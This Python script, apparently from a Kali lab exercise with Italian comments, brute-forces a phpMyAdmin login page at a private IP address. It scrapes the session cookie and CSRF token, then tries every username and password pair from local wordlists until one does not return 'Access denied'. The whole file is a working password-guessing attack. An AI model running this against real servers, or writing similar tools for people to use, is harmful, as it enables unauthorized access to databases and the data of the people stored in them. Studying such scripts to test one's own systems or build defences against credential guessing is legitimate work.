import requests,colorama
from colorama import Fore
from bs4 import BeautifulSoup

def bruteforce(url,keys):
   username_file = open('/home/kali/Documenti/bruteforce-database/user.txt')
   password_file = open('/home/kali/Documenti/bruteforce-database/pass.txt')
   user_list = username_file.readlines() #Apre i file per la lettura delle liste user - pass.
   pwd_list = password_file.readlines()
   found=0
   print("Work in progress...Wait please")
   for user in user_list:   # Invia una richiesta POST con cookies e parametri per ogni coppia user-pass
       user = user.rstrip() # per tentare il login.
       if(found==1):
         break
       for pwd in pwd_list:
           pwd = pwd.rstrip()
           header={'Content-Type':'application/x-www-form-urlencoded','Set-Cookie':f'phpMyAdmin={keys["cookie"]}'}
           params={'phpMyAdmin':keys['cookie'],'phpMyAdmin':keys['cookie'],'pma_username':user,'pma_password':pwd
           ,'server':1,'phpMyAdmin':keys['cookie'],'token':keys['token']}
           rp=requests.post(url,headers=header,data=params)

           if not"Access denied" in rp.text: #Se il server restituisce la risorsa in html che non contiene
             print("Logged with: "+Fore.GREEN+user+" - "+pwd) # quella stringa, user e pass sono corretti.
             found=1
             break


def getdata(url): 
   r=requests.get(url) #Invia una richiesta  di tipo get per intercettare cookie e token.
   cookie=r.cookies['phpMyAdmin']
   body= BeautifulSoup(r.text,'html.parser')
   token=body.find("input",{"name":"token"})["value"]
   return {'cookie':cookie,'token':token}


url="http://192.168.50.101/phpMyAdmin/"
keys=getdata(url)
bruteforce(url,keys)
